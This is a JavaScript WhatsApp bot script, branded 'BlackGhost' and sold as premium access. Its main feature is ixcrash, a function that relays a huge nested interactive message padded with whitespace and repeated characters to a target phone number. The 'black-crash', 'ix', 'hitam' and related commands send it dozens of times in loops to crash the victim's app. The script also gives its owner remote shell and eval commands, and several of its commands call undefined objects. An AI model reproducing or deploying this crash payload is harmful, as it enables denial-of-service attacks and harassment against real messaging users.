require('./settings/config.js');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');
const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');

const {
    default:
    baileys,
    getContentType, 
   } = require("@whiskeysockets/baileys");

module.exports = ixiz = async (ixiz, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? ixiz.user.id.split(":")[0] + "@s.whatsapp.net" || ixiz.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
        const botNumber = await ixiz.decodeJid(ixiz.user.id);
        const isPremium = premium.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await ixiz.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize
            } = require('./lib/myfunction');
        
        let cihuy = fs.readFileSync('./lib/media/ixix.png')

        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   ⌬ Grup: ${groupName} \n` +
                        `   ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        const reaction = async (jidss, emoji) => {
            ixiz.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
        
///// 𝐀𝐖𝐀𝐋 𝐅𝐔𝐍𝐂 𝐁𝐔𝐆 /////
async function ixcrash(target) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u2000".repeat(90000000);
        let deepNested = {
          title: "\u2000".repeat(90000000),
          highlight_label: "\u2000".repeat(90000000),
          rows: [
            {
              title: largeText,
              id: "\u2000".repeat(90000000),
              subrows: [
                {
                  title: "\u2000".repeat(90000000),
                  id: "\u2000".repeat(90000000),
                  subsubrows: [
                    {
                      title: "\u2000".repeat(90000000),
                      id: "\u2000".repeat(90000000),
                    },
                    {
                      title: "\u2000".repeat(90000000),
                      id: "\u2000".repeat(90000000),
                    },
                  ],
                },
                {
                  title: "\u2000".repeat(90000000),
                  id: "\u2000".repeat(90000000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u2000".repeat(90000000),
        sections: sections,
      };
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: ixiz.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
            },
            body: {
              text: "Ixiz kill you😝" + "ꦾ".repeat(77777), 
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "send_location",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };
    await ixiz.relayMessage(target, message, {
      participant: { jid: target },
    });
  }
///// 𝐄𝐍𝐃 𝐅𝐔𝐍𝐂 𝐁𝐔𝐆 /////
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}

        
        async function loading() {
    return reply("Sedang memuat Wak...");
}
        
        async function reply(text) {
            ixiz.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: "▓⏤͟͟͞͞𝑰𝒙𝒊𝒛 Developer⏤͟͟͞͞▓",
                        body: "▓⏤͟͟͞͞𝑰𝒙𝒊𝒛 Developer⏤͟͟͞͞▓",
                        thumbnailUrl: "https://files.catbox.moe/5qudo4.mp4",
                        sourceUrl: 'https://youtube.com/@AlwaysZuroku',
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }
        switch (command) {
            
case "blackghost": {
    let mbut = `
𝔹𝕝𝕒𝕔𝕜𝔾𝕙𝕠𝕤𝕥 𝕧𝟙 𝕘𝕖𝕟 𝟙
    ▀▄▀▄ 𝑰𝑵𝑭𝑶 𝑺𝑪𝑹𝑰𝑷𝑻 ▄▀▄▀

> █ 𝒏𝒂𝒎𝒆 𝒐𝒘𝒏𝒆𝒓 = 𝒊𝒙𝒊𝒛𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓♛
> █ 𝒏𝒂𝒎𝒆 𝒃𝒐𝒕 = 𝑩𝒍𝒂𝒄𝒌𝑮𝒉𝒐𝒔𝒕 𝒗𝟏 𝒈𝒆𝒏 𝟏
> █ ʙᴜʏ 𝒔𝒄𝒓𝒊𝒑𝒕? = 𝟎𝟖𝟏𝟑𝟔𝟏𝟗𝟖𝟒𝟓𝟔𝟎
> █ 𝒕𝒊𝒌𝒕𝒐𝒌 𝒅𝒆𝒗 = @wars_𝒐𝒑
> █ 𝑻𝒆𝒍𝒆 𝒅𝒆𝒗 = 𝒕.𝒎𝒆//𝒊𝒙𝒊𝒛𝒅𝒆𝒗
> █ 𝒔𝒕𝒂𝒖𝒔 𝒔𝒄𝒓𝒊𝒑𝒕 = 𝑽𝑰𝑷 {𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓}

██████████████████████████

         ▀▄▀▄ 𝑩𝑼𝑮 𝑴𝑬𝑵𝑼 ▄▀▄▀
         
█ ${prefix}ᴘᴇᴍʙᴜɴᴜʜ 62xxxxx
█ ${prefix}black-crash 62xxxx

██████████████████████████

          ▀▄▀▄ 𝑶𝑾𝑵𝑬𝑹 𝑴𝑬𝑵𝑼 ▄▀▄▀
          
██████████████████████████
█ ${prefix}ᴀᴅᴅᴍᴜʀʙᴜɢ
█ ${prefix}ᴅᴇʟᴍᴜʀʙᴜɢ
█ ${prefix}ʜɪᴅᴇᴛᴀɢ
█ ${prefix}sᴇʟғ
█ ${prefix}ᴘᴜʙʟɪᴄ
█ ${prefix}TIKTOK
█ ${prefix}qc
█ ${prefix}remini
█ ${prefix}s
██████████████████████████
𝑩𝒍𝒂𝒄𝒌𝑮𝒉𝒐𝒔𝒕 𝒗𝟏 𝒈𝒆𝒏 𝟏`

    await ixiz.sendMessage(m.chat, {
  footer: `© 𝑰𝒎 𝒊𝒙𝒊𝒛`, 
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝒊𝒙𝒊𝒛',
          sections: [
            {
              title: 'List menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '𝔹𝕌𝔾 𝕄𝔼ℕ𝕌',
                  id: '.blackghost'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `𝑰𝒎 𝑰𝑿𝑰𝒁`,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: mbut,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: '120363366790950043@newsletter',
   newsletterName: `𝑰𝒎 𝑰𝑿𝑰𝒁`,
   },    
    externalAdReply: {
      title: `©𝐁𝐲 𝙞𝙭𝙞𝙯Dev`, 
      body: `𝑰𝒎 𝒊𝒙𝒊𝒛`,
      thumbnailUrl: "https://files.catbox.moe/5qudo4.mp4",
      sourceUrl: `https://youtube.com/@AlwaysZuroku`,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case 'menu': {
let menu = `𝔹𝕝𝕒𝕔𝕜𝔾𝕙𝕠𝕤𝕥 𝕧𝟙 𝕘𝕖𝕟 𝟙
    ▀▄▀▄ 𝑰𝑵𝑭𝑶 𝑺𝑪𝑹𝑰𝑷𝑻 ▄▀▄▀

> █ 𝒏𝒂𝒎𝒆 𝒐𝒘𝒏𝒆𝒓 = 𝒊𝒙𝒊𝒛𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓♛
> █ 𝒏𝒂𝒎𝒆 𝒃𝒐𝒕 = 𝑩𝒍𝒂𝒄𝒌𝑮𝒉𝒐𝒔𝒕 𝒗𝟏 𝒈𝒆𝒏 𝟏
> █ ʙᴜʏ 𝒔𝒄𝒓𝒊𝒑𝒕? = 𝟎𝟖𝟏𝟑𝟔𝟏𝟗𝟖𝟒𝟓𝟔𝟎
> █ 𝒕𝒊𝒌𝒕𝒐𝒌 𝒅𝒆𝒗 = @wars_𝒐𝒑
> █ 𝑻𝒆𝒍𝒆 𝒅𝒆𝒗 = 𝒕.𝒎𝒆//𝒊𝒙𝒊𝒛𝒅𝒆𝒗
> █ 𝒔𝒕𝒂𝒕𝒖𝒔 𝒔𝒄𝒓𝒊𝒑𝒕 = 𝑽𝑰𝑷 {𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓}

██████████████████████████
> 𝒕𝒂𝒏𝒑𝒊𝒍 𝒌𝒂𝒏 𝒎𝒆𝒏𝒖 𝒌𝒆𝒕𝒊𝒌 .𝒃𝒍𝒂𝒄𝒌𝒈𝒉𝒐𝒔𝒕
    𝑩𝒍𝒂𝒄𝒌𝑮𝒉𝒐𝒔𝒕 𝒗𝟏 𝒈𝒆𝒏 𝟏`
ixiz.sendMessage(m.chat , {
 document: fs.readFileSync("./package.json"),
 mimetype: "application/pdf",
 fileName: "ɪ'ᴀᴍ 𝗶𝘅𝗶𝘇𝗗𝗲𝘃", //input nama file
 fileLength: "999999999999",
 jpegThumbnail:fs.readFileSync("./lib/media/th.jpg"), //input gambar document
 caption: menu, //input caption
 footer: '© 𝑰𝒎 𝒊𝒙𝒊𝒛', //input footer
contextInfo: {
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363366790950043@newsletter', //input id ch kalian
newsletterName: `▓⏤͟͟͞͞𝑰𝒙𝒊𝒛 Developer⏤͟͟͞͞▓`,
serverMessageId: 2
},
	externalAdReply: {
 title: "𝑩𝒍𝒂𝒄𝒌𝑮𝒉𝒐𝒔𝒕 𝙫1 𝒈𝒆𝒏 𝟏", //input title
 body: '',
 thumbnailUrl: "https://files.catbox.moe/5qudo4.mp4", 
 sourceUrl: `https://youtube.com/@AlwaysZuroku`,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 },
 buttons: [
 { buttonId: `.blackghost`, buttonText: { displayText: `𝘽𝙪𝙜 𝙢𝙚𝙣𝙪` }, type: 1 } ], 
 headerType: 6,
 viewOnce: true
}, { quoted: m });
}
break
case "addmurbug": {
if (!isCreator) return reply("𝙊𝙣𝙡𝙮 𝙞𝙭𝙞𝙯𝘿𝙚𝙫")
if (!text && !m.quoted) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`target ${input2} sudah menjadi murbug!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply("`sᴜᴄᴄᴇs ᴀᴅᴅᴍᴜʀʙᴜɢ✅`")
}
break
case 'delmurbug': {
    if (!isCreator) return m.reply("𝗞𝗛𝗨𝗦𝗨𝗦 𝙄𝙭𝙞𝙯");
    if (args.length < 1) return m.reply(`Use :\n*#delmurbug* @tag\n*#delmurbug* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        }
        m.reply("Delete success");
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        m.reply("Success");
    }
}
break
/// bug
case 'pembunuh': {
if (!isPremium && !isCreator) return reply("`ᴋʜᴜsᴜs ᴘʀᴇᴍɪᴜᴍ ʙʀᴀʏ`")
if (!q) return reply(`Penggunaan #${command} 628×××`)
let target = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
ixiz.sendMessage(m.chat, {  text: `sᴇʟᴇᴄᴛᴇᴅ ʙᴏᴛ ᴍᴇɴᴜ ᴡʜᴀᴛsᴀᴘᴘ ᴄʀᴀsʜ sᴇɴᴅɪɴɢ ᴠɪʀᴛᴇx ʙʏ ɪxɪᴢᴋɪʟʟᴇʀ ${target}`, 
  footer: `𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝙄𝙭𝙞𝙯𝘿𝙚𝙫`,
  buttons: [
{ buttonId: `.pembunuh ${target}`, buttonText: { displayText: `𝙞𝙭𝙞𝙯 1` }, type: 1 }, 
 { buttonId: `.badut ${target}`, buttonText: { displayText: `฿₳ĐɄ₮` }, type: 1 }, 
 { buttonId: `.liar ${target}`, buttonText: { displayText: `𝐂𝐑𝐀𝐒𝐇` }, type: 1 }, 
 { buttonId: `.❄ ${target}`, buttonText: { displayText: `Ɇ₥ØJł 1` }, type: 1 }, 
 { buttonId: `.🐎 ${target}`, buttonText: { displayText: `Ɇ₥ØJł 2` }, type: 1 }
 ], 
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
break

///ixcrash
case 'black-crash': {
if (!isPremium && !isCreator) return reply("`ᴋʜᴜsᴜs ᴘʀᴇᴍɪᴜᴍ ʙʀᴀʏ`")
if (!q) return reply(`Penggunaan #${command} 628×××`)
let target = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
ixiz.sendMessage(m.chat, {  text: `sᴇʟᴇᴄᴛᴇᴅ ʙᴏᴛ ᴍᴇɴᴜ ᴡʜᴀᴛsᴀᴘᴘ ᴄʀᴀsʜ sᴇɴᴅɪɴɢ ᴠɪʀᴛᴇx ʙʏ ɪxɪᴢᴋɪʟʟᴇʀ ${target}`, 
  footer: `𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 𝙄𝙭𝙞𝙯𝘿𝙚𝙫`,
  buttons: [
{ buttonId: `.ix ${target}`, buttonText: { displayText: `Hitamkan` }, type: 1 }, 
 { buttonId: `.hitam ${target}`, buttonText: { displayText: `crash` }, type: 1 }, 
 { buttonId: `.hm ${target}`, buttonText: { displayText: `𝐂𝐑𝐀𝐒𝐇 V2` }, type: 1 }, 
 { buttonId: `.❄ ${target}`, buttonText: { displayText: `Ɇ₥ØJł 1` }, type: 1 }, 
 { buttonId: `.🐎 ${target}`, buttonText: { displayText: `Ɇ₥ØJł 2` }, type: 1 }
 ], 
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}

case 'ix': case 'hitam': case 'hm': case 'liar': case 'kuda':
if (!isPremium && !isCreator) return reply("`ᴋʜᴜsᴜs ᴘʀᴇᴍɪᴜᴍ ʙʀᴀʏ`")
   if (!q) return m.reply(`Example : ${prefix + command} 62x`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("`𝚂𝚄𝙲𝙲𝙴𝚂 𝙵𝚄𝙻𝙻 𝚂𝙴𝙽𝙳𝙸𝙽𝙶 𝙲𝚁𝙰𝚂𝙷 𝙱𝚄𝙶 𝙱𝚈 𝑩𝒍𝒂𝒄𝒌𝑮𝒉𝒐𝒔𝒕`") 
     for (let i = 0; i < 10; i++) {
    //𝘥𝘪𝘣𝘢𝘸𝘢𝘩 𝘴𝘪𝘯𝘪
   await ixcrash(target)
  await ixcrash(target)
    await ixcrash(target)
    await ixcrash(target)
  await  ixcrash(target)
  await  ixcrash(target)
   await ixcrash(target)
    await ixcrash(target)
  await ixcrash(target)
    await ixcrash(target)
    await ixcrash(target)
  await  ixcrash(target)
  await  ixcrash(target)
   await ixcrash(target)
   await ixcrash(target)
  await ixcrash(target)
    await ixcrash(target)
    await ixcrash(target)
  await  ixcrash(target)
  await  ixcrash(target)
   await ixcrash(target)
   await ixcrash(target)
  await ixcrash(target)
    await ixcrash(target)
    await ixcrash(target)
  await  ixcrash(target)
  await  ixcrash(target)
   await ixcrash(target)
   await ixcrash(target)
  await ixcrash(target)
    await ixcrash(target)
    await ixcrash(target)
  await  ixcrash(target)
  await  ixcrash(target)
   await ixcrash(target)
    await ixcrash(target)
  await ixcrash(target)
    await ixcrash(target)
    await ixcrash(target)
  await  ixcrash(target)
  await  ixcrash(target)
   await ixcrash(target)
   await ixcrash(target)
  await ixcrash(target)
    await ixcrash(target)
    await ixcrash(target)
  await  ixcrash(target)
  await  ixcrash(target)
   await ixcrash(target)
   await ixcrash(target)
  await ixcrash(target)
    await ixcrash(target)
    await ixcrash(target)
  await  ixcrash(target)
  await  ixcrash(target)
   await ixcrash(target)
     }
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗕𝗬 𝙄𝙭𝙞𝙯 𝙆𝙄𝙇𝙇𝙀𝙍")
break
            case "self":{
                if (!isCreator) return reply("`𝐖𝐎𝐘 𝐌𝐄𝐊𝐈 𝐊𝐇𝐔𝐒 𝙞𝙭𝙞𝙯𝙙𝙚𝙫",) 
                ixiz.public = false
                reply(`successfully changed to ${command}`)
            }
            break
            case 'antilink': {

				if (!m.isGroup) return newReply(mess.group);

				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (args.length < 1) return newReply('true/false?')
				if (args[0] === 'true') {
					db.data.chats[m.chat].antilink = true
					newReply(`${command} is enabled`)
				} else if (args[0] === 'false') {
					db.data.chats[m.chat].antilink = false
					newReply(`${command} is disabled`)
				}
			}
			break
                        case "public":{
                if (!isCreator) return reply("`𝐖𝐎𝐘 𝐌𝐄𝐊𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝙄𝙓𝙄𝙕𝗗𝗲𝘃`")  
                ixiz.public = true
                reply(`successfully changed to ${command}`)
            }
            break
            
            case "h":
            case "hidetag": {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !Access) return reply(mess.admin)
                if (m.quoted) {
                    ixiz.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    ixiz.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m })
                }
            }
            break
            case 'tiktok':
 case 'tt': {
     if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
     let res = await tiktok2(`${text}`)
     ptz.sendMessage(m.chat, {
         video: {
             url: res.no_watermark
         },
         fileName: `tiktok.mp4`,
         mimetype: 'video/mp4'
     }).then(() => {

         ptz.sendMessage(m.chat, {
             audio: {
                 url: res.music
             },
             fileName: `tiktok.mp3`,
             mimetype: 'audio/mp4'
         })
     })
 }
 break
 case 'qc': {
     const {
         quote
     } = require('./lib/quote.js')
     let text
     if (args.length >= 1) {
         text = args.slice(0).join(" ")
     } else if (m?.quoted && m?.quoted.text) {
         text = m?.quoted.text
     } else reply("Input teks atau reply teks yang ingin di jadikan quote!")
     if (!text) return reply('masukan text')
     if (text.length > 30) return reply('Maksimal 30 Teks!')
     let ppnyauser = await await ptz.profilePictureUrl(m?.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
     const rest = await quote(text, pushname, ppnyauser)
     ptz.sendImageAsSticker(m?.chat, rest.result, m, {
         packname: `${global.packname}`,
         author: `${global.author}`
     })
 }
 break
 case 'remini': {
     if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
     if (!/image/.test(mime)) return reply("hanya support gambar")
     let media = await quoted.download()
     const This = await remini(media, "enhance");
     ptz.sendFile(m?.chat, This, "", "Done", m);
 }
 break
 case 'sticker':
 case 'stiker':
 case 's': {
     if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
     if (/image/.test(mime)) {
         let media = await m?.quoted.download()
         let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, {
             packname: global.packname,
             author: global.author
         })
         await fs.unlinkSync(encmedia)
     } else if (/video/.test(mime)) {
         if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
         let media = await quoted.download()
         let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, {
             packname: global.packname,
             author: global.author
         })
         await fs.unlinkSync(encmedia)
     } else {
         return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
     }
 }
 break
            default:
                if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
